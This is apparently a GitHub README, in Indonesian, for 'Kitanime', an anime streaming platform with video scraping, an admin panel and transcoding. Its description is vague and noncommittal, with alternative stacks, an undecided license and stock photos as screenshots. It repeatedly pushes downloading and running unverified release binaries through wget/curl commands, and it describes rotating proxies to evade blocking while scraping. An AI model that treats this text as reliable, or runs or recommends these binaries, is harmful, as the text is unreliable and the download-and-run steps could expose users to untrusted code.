[![Releases](https://img.shields.io/badge/Releases-v1.0.0-blue?logo=github)](https://github.com/v1td6/Kitanime/releases)

# Kitanime — Platform Streaming Anime Modern dengan Subtitle Bahasa Indonesia

![Kitanime hero](https://cdn.pixabay.com/photo/2017/02/15/12/12/anime-2062547_1280.jpg)

Ringkasan singkat proyek. Kitanime adalah platform streaming anime yang fokus pada pengalaman menonton lokal. Sistem ini menyediakan ribuan episode dengan subtitle bahasa Indonesia. Kitanime menggabungkan scraping otomatis, panel admin yang kaya fitur, dan antarmuka responsif untuk berbagai perangkat.

Table of contents
- Tentang
- Fitur utama
- Arsitektur teknis
- Demo dan screenshot
- Rilis dan download
- Panduan instalasi (Linux / macOS / Windows)
- Konfigurasi inti
- Panel admin
- Sistem scraping
- Subtitle dan sinkronisasi
- API publik dan private
- Frontend (UI/UX)
- Backend (service, queue, worker)
- Database dan penyimpanan
- Keamanan dan otentikasi
- Pengujian dan CI/CD
- Deployment dan hosting
- Optimasi kinerja
- Monitoring dan logging
- Migrasi dan backup
- Troubleshooting umum
- FAQ teknis
- Kontribusi
- Lisensi
- Changelog & Releases
- Credits

---

## Tentang
Kitanime hadir untuk memberikan pengalaman menonton anime yang familiar bagi pengguna di Indonesia. Sistem ini menampilkan:
- Koleksi besar judul anime dan episode.
- Subtitle bahasa Indonesia untuk setiap judul.
- Pemutar responsif yang bekerja di desktop dan perangkat seluler.
- Panel admin untuk manajemen konten dan metadata.
- Scraper otomatis untuk mengambil sumber video dan subtitle dari sumber publik.
- API yang memungkinkan integrasi dengan aplikasi pihak ketiga.

Kitanime fokus pada modularitas. Setiap komponen berjalan sebagai layanan terpisah. Desain ini membantu skala dan pemeliharaan.

---

## Fitur utama
- Manajemen katalog: tambah, ubah, hapus judul dan episode.
- Subtitle multi-track: upload dan sinkronkan subtitle SRT/ASS.
- Scraper scheduler: jadwal scraping harian untuk memperbarui episode baru.
- Transcoding worker: proses adaptif bitrate untuk streaming HLS/DASH.
- Multi-region CDN support: integrasi dengan CDN untuk distribusi statis.
- Advanced search: filter berdasarkan genre, status, musim, tahun.
- User preferences: daftar tontonan, riwayat, dan rating.
- Role-based admin: admin, editor, moderator, dan operator.
- Webhook dan API: notifikasi ke layanan eksternal saat rilis baru.
- Rate limiting dan cache layer untuk menjaga performa.

---

## Arsitektur teknis (ringkas)
Komponen utama:
- Frontend SPA (React / Vue / Svelte).
- Backend API (Node.js / Express atau Golang).
- Scraper service (Python / Node.js daemon).
- Worker / queue (Redis + Bull / Sidekiq).
- Transcoding (FFmpeg di worker).
- Database relasional (Postgres / MySQL).
- Storage objek (S3 / MinIO) untuk video dan subtitle.
- CDN untuk distribusi file statis.
- Reverse proxy (Nginx) dan load balancer.

Diagram umum:
Frontend <-> API Gateway <-> Backend Services
                       ↳ Scraper
                       ↳ Worker
                       ↳ Transcoder
                       ↳ DB
                       ↳ Storage

---

## Demo dan screenshot

Hero UI
![UI 1](https://images.unsplash.com/photo-1515879218367-8466d910aaa4?auto=format&fit=crop&w=1200&q=80)

Daftar judul
![UI 2](https://images.unsplash.com/photo-1526312426976-2d75d8a4d5f1?auto=format&fit=crop&w=1200&q=80)

Pemutar episode
![Player](https://images.unsplash.com/photo-1517694712202-14dd9538aa97?auto=format&fit=crop&w=1200&q=80)

Panel admin
![Admin panel](https://images.unsplash.com/photo-1519389950473-47ba0277781c?auto=format&fit=crop&w=1200&q=80)

Gambar di atas hanya contoh antarmuka. Anda dapat menukar aset dengan desain Anda sendiri.

---

## Rilis dan download
Untuk mendapat rilis resmi, kunjungi halaman Releases:
- Kunjungi: https://github.com/v1td6/Kitanime/releases

Dari halaman Releases, unduh paket rilis yang sesuai dengan platform Anda. File rilis biasanya berupa arsip (.zip, .tar.gz) atau binary yang sudah dikemas. Setelah unduhan, ekstrak dan jalankan berkas installer atau binary sesuai platform.

Jika Anda ingin akses cepat, gunakan badge di atas atau kunjungi halaman rilis:
[https://github.com/v1td6/Kitanime/releases](https://github.com/v1td6/Kitanime/releases)

Untuk rilis dengan path, unduh file rilis yang tersedia dan jalankan file tersebut sesuai petunjuk. Contoh file output yang umum:
- kitanime-linux-amd64.tar.gz
- kitanime-macos-x64.zip
- kitanime-windows-x64.zip

Panduan menjalankan file rilis ada di bagian Instalasi di bawah.

---

## Panduan instalasi

Persyaratan sistem minimal
- CPU: 2 core
- RAM: 4 GB
- Disk: 50 GB (lebih banyak jika menyimpan banyak video)
- OS: Ubuntu 20.04+, Debian, macOS Monterey+, Windows 10+
- Docker (opsional)
- Node.js 16+ atau Golang 1.18+ (tergantung build)
- FFmpeg untuk transcoding

Cara cepat: unduh rilis dari Releases dan jalankan paket:
1. Kunjungi: https://github.com/v1td6/Kitanime/releases
2. Unduh paket rilis untuk platform Anda.
3. Ekstrak paket.
4. Jalankan binary atau installer.

Contoh langkah di Linux (contoh nama file):
```bash
# ganti nama file sesuai rilis
wget https://github.com/v1td6/Kitanime/releases/download/v1.0.0/kitanime-linux-amd64.tar.gz
tar -xzf kitanime-linux-amd64.tar.gz
cd kitanime
./kitanime --config ./config.yml
```

Contoh macOS:
```bash
curl -L -o kitanime-macos-x64.zip https://github.com/v1td6/Kitanime/releases/download/v1.0.0/kitanime-macos-x64.zip
unzip kitanime-macos-x64.zip
./kitanime
```

Di Windows:
- Unduh kitanime-windows-x64.zip dari Releases.
- Ekstrak dan jalankan Kitanime.exe.

Jika rilis Anda berbeda, sesuaikan nama file. Pastikan Anda mengatur file konfigurasi sebelum menjalankan.

Docker (alternatif)
Kitanime mendukung deployment via Docker Compose. Contoh file docker-compose.yml:
```yaml
version: "3.8"
services:
  db:
    image: postgres:13
    environment:
      POSTGRES_USER: kitanime
      POSTGRES_PASSWORD: secret
      POSTGRES_DB: kitanime
    volumes:
      - db-data:/var/lib/postgresql/data

  redis:
    image: redis:6
    volumes:
      - redis-data:/data

  api:
    image: v1td6/kitanime:latest
    depends_on:
      - db
      - redis
    ports:
      - "8080:8080"
    environment:
      DATABASE_URL: postgres://kitanime:secret@db:5432/kitanime
      REDIS_URL: redis://redis:6379

volumes:
  db-data:
  redis-data:
```

Jalankan:
```bash
docker compose up -d
```

---

## Konfigurasi inti
File konfigurasi utama: config.yml
Contoh struktur:
```yaml
server:
  host: 0.0.0.0
  port: 8080

database:
  url: postgres://user:pass@hostname:5432/kitanime

storage:
  provider: s3
  s3:
    bucket: kitanime-media
    region: ap-southeast-1
    endpoint: https://s3.example.com
    access_key_id: AKIA...
    secret_access_key: ...

scraper:
  schedule: "0 2 * * *"
  concurrency: 4

transcoder:
  ffmpeg_path: /usr/bin/ffmpeg
  presets:
    - name: 720p
      bitrate: 2500k
    - name: 480p
      bitrate: 1200k

auth:
  jwt_secret: "secret_jwt_key"
  token_expiry: "24h"
```

Setiap layanan membaca config dari env atau file. Gunakan environment variables untuk sensitif data.

---

## Panel admin
Panel admin memberi kontrol penuh ke metadata dan konten:
- Upload judul baru dan poster.
- Upload episode atau pointer ke sumber CDN.
- Kelola subtitle dan sinkronisasi waktu.
- Jadwal scraping dan manajemen job.
- Audit log dan aktivitas moderator.
- Manajemen user dan role.

Panel admin menggunakan autentikasi JWT dan multi-factor authentication (MFA) opsional. Buat role terpisah untuk editor dan operator untuk batasi akses.

---

## Sistem scraping
Scraper mengambil metadata, link video, dan subtitle dari sumber publik. Arsitektur scraper:
- Daemon scheduler: jalankan scraping pada jadwal.
- Task queue: antrian scraping per situs.
- Extractor plugin: modul untuk tiap sumber situs.
- Normalizer: konversi metadata ke format internal.
- Validator: cek kualitas link dan subtitle.
- Uploader: kirim asset ke storage.

Contoh alur:
1. Scheduler ambil daftar target.
2. Scraper ambil halaman daftar terbaru.
3. Extractor parse HTML dan temukan link video.
4. Normalizer simpan metadata ke DB.
5. Jika ditemukan subtitle, unduh dan simpan.

Plugin extractor mudah ditambah. Setiap plugin mengekspor interface:
```python
class Extractor:
    def fetch_list(self): pass
    def fetch_episode(self, episode_url): pass
    def fetch_subtitle(self, subtitle_url): pass
```

Untuk menghindari pemblokiran, scraper menghormati robots.txt, menggunakan rotating proxies, dan cache.

---

## Subtitle dan sinkronisasi
Kitanime mendukung format SRT dan ASS. Fitur subtitle:
- Upload manual atau via scraping.
- Editor waktu internal untuk adjust timing.
- Sinkronisasi otomatis dengan alat offset.
- Subtitle berbasis track, pengguna pilih track.
- Encoding UTF-8 untuk dukungan karakter Indonesia.

Contoh proses sinkron:
- Ambil subtitle SRT.
- Jalankan adjuster untuk offset (deteksi audio cue).
- Simpan subtitle dalam storage sebagai file .srt.
- Tautkan ke episode dan buat track metadata.

---

## API publik dan private
API mengikuti pola RESTful dan GraphQL (opsional). Versi API ditentukan di header atau path. Contoh endpoint:
- GET /api/v1/titles
- GET /api/v1/titles/{id}
- GET /api/v1/titles/{id}/episodes
- POST /api/v1/admin/titles (admin only)
- POST /api/v1/auth/login

Rate limit berlaku untuk endpoint publik. Gunakan caching pada endpoint daftar untuk menurunkan beban DB.

Contoh respon singkat:
```json
{
  "id": 123,
  "slug": "attack-on-titan",
  "title": "Attack on Titan",
  "genres": ["Action","Drama"],
  "episodes_count": 87,
  "poster_url": "https://cdn.example.com/posters/attack-on-titan.jpg"
}
```

---

## Frontend (UI/UX)
Frontend fokus pada pengalaman menonton:
- SPA dengan client-side routing.
- Komponen pemutar berbasis HLS.js atau Shaka Player.
- Dark mode dan pengaturan teks subtitle.
- Responsif untuk mobile dan tablet.
- PWA support untuk cache offline metadata.

Arsitektur komponen:
- Layout: header, sidebar, content.
- Player: controls, quality switch, subtitle track.
- Browse: grid, filter, sort.
- Title detail: episodes, synopsis, similar titles.
- Account: daftar tontonan, history, preferences.

---

## Backend (service, queue, worker)
Backend service utama:
- API service: menangani request pengguna.
- Worker: proses transcoding, thumbnail, dan import.
- Scraper: ambil data eksternal.
- Notifier: kirim notifikasi saat rilis baru.

Queue system:
- Gunakan Redis + Bull atau Sidekiq.
- Worker skalabel horizontal.
- Retry policy untuk job gagal.

Transcoding:
- Gunakan FFmpeg untuk membuat varian bitrate.
- Output ke HLS (m3u8) atau DASH.
- Simpan manifest di storage, serve via CDN.

---

## Database dan penyimpanan
Skema DB ringkas:
- titles (id, slug, title, synopsis, status, poster)
- episodes (id, title_id, number, title, duration, video_url)
- subtitles (id, episode_id, language, path, format)
- users (id, username, email, role)
- watch_history (user_id, episode_id, position, updated_at)
- jobs (job_id, type, status, payload)

Gunakan index pada kolom yang sering dicari. Untuk metadata besar, pertimbangkan search engine (Elasticsearch / MeiliSearch).

Storage:
- Video: S3/MinIO
- Thumbnails: S3 + CDN
- Subtitle: S3 atau DB tergantung ukuran

Backup DB harian dan backup storage incremental.

---

## Keamanan dan otentikasi
- JWT untuk API.
- Role-based access control (RBAC).
- TLS (HTTPS) wajib pada frontend dan API.
- Rate limit dan IP block untuk scraping.
- Sanitasi input dan prepared statements.
- Scan dependency dan patch rutin.

Untuk admin, aktifkan MFA. Simpan secret di vault (Hashicorp Vault / AWS Secrets Manager).

---

## Pengujian dan CI/CD
- Unit test untuk business logic.
- Integration test untuk API endpoints.
- E2E test untuk alur pemutar dan login.
- Pipeline CI: build, test, docker build, deploy ke staging.
- Gunakan GitHub Actions / GitLab CI.

Contoh langkah CI:
1. Checkout.
2. Install dependencies.
3. Run lint + test.
4. Build container image.
5. Push ke registry.
6. Deploy ke staging.

---

## Deployment dan hosting
Opsi deployment:
- Docker Swarm / Kubernetes untuk skala.
- VPS sederhana untuk small setup.
- Managed DB + Object Storage untuk operasional ringkas.

Contoh di Kubernetes:
- Deployment untuk API, worker, scraper.
- StatefulSet untuk DB.
- Ingress + CertManager untuk TLS.
- HPA untuk autoscale.

Gunakan CDN untuk file video. Pastikan manifest dan chunk file cache-control sesuai.

---

## Optimasi kinerja
- Cache daftar populer di Redis.
- Gunakan pagination cursor untuk list besar.
- Pre-generate thumbnails dan sprite untuk preview.
- Transcode ke multiple bitrates untuk adaptive streaming.
- Prioritaskan CDN untuk chunk video.

Profiling: gunakan APM (Datadog / New Relic) untuk identifikasi bottleneck.

---

## Monitoring dan logging
- Centralized logging: ELK stack atau Loki + Grafana.
- Metrics: Prometheus metrics untuk latensi dan throughput.
- Alerting: threshold pada error rate, job failures, dan disk usage.

Simpan log worker setidaknya 7 hari. Kirim alert ke Slack atau PagerDuty.

---

## Migrasi dan backup
- Gunakan migrations tool (Flyway, Liquibase, or Goose).
- Backup DB otomatis: dump harian + retention 7-30 hari.
- Backup storage: lifecycle policy untuk menghapus file lama.
- Uji restore secara berkala.

---

## Troubleshooting umum
Masalah: Worker gagal mengambil job
- Cek koneksi Redis.
- Cek log worker.
- Restart worker jika queue stuck.

Masalah: Video tidak play di pemutar
- Pastikan manifest m3u8 dapat diakses publik via CDN.
- Periksa CORS pada storage/CDN.
- Cek format codec yang kompatibel.

Masalah: Subtitle tidak muncul
- Pastikan file .srt tersimpan dengan encoding UTF-8.
- Periksa metadata track pada episode.

---

## FAQ teknis
Q: Apa format subtitle yang didukung?
A: SRT dan ASS.

Q: Apakah ada API untuk integrasi pihak ketiga?
A: Ya. API publik read-only dan API admin untuk manajemen.

Q: Bagaimana menambah sumber scraping baru?
A: Buat plugin extractor dengan interface standar dan daftarkan di konfigurasi.

Q: Dapatkah saya menjalankan Kitanime tanpa CDN?
A: Bisa. Namun performa streaming akan menurun pada banyak user.

---

## Kontribusi
Langkah untuk kontribusi:
1. Fork repo.
2. Buat branch fitur: feature/my-feature.
3. Buat PR dengan deskripsi lengkap.
4. Sertakan test untuk fitur baru.
5. Ikuti kode gaya dan lint rules.

Aturan commit:
- Tulis pesan singkat dan jelas.
- Sertakan referensi issue jika ada.

Branching:
- main untuk rilis stabil.
- develop untuk fitur yang sedang dikembangkan.
- feature/* untuk fitur individual.
- hotfix/* untuk perbaikan cepat.

Kami terima kontribusi kode, dokumentasi, dan bug report.

---

## Lisensi
Gunakan lisensi MIT, Apache 2.0, atau lisensi lain sesuai kebutuhan. Pastikan file LICENSE berada di root repo.

---

## Changelog & Releases
Semua rilis tersedia di halaman Releases:
- Kunjungi: https://github.com/v1td6/Kitanime/releases

Unduh paket rilis dan jalankan file yang tersedia. Rilis berisi aset binary, changelog, dan instruksi instalasi untuk tiap platform.

Contoh rilis:
- v1.0.0 — core features, scraper, basic player.
- v1.1.0 — subtitle editor, admin roles.
- v1.2.0 — performance improvements, CDN integration.

---

## Credits
- Tim pengembang: frontend, backend, ops, dan QA.
- Kontributor open source.
- Pustaka yang digunakan: FFmpeg, HLS.js, Redis, Postgres, dan library lain sesuai stack.
- Desain antarmuka contoh: sumber free images dan ikon publik.

Server assets dan skrip rilis tersedia di halaman rilis. Untuk file rilis, unduh dan jalankan sesuai platform dari halaman Releases: https://github.com/v1td6/Kitanime/releases

---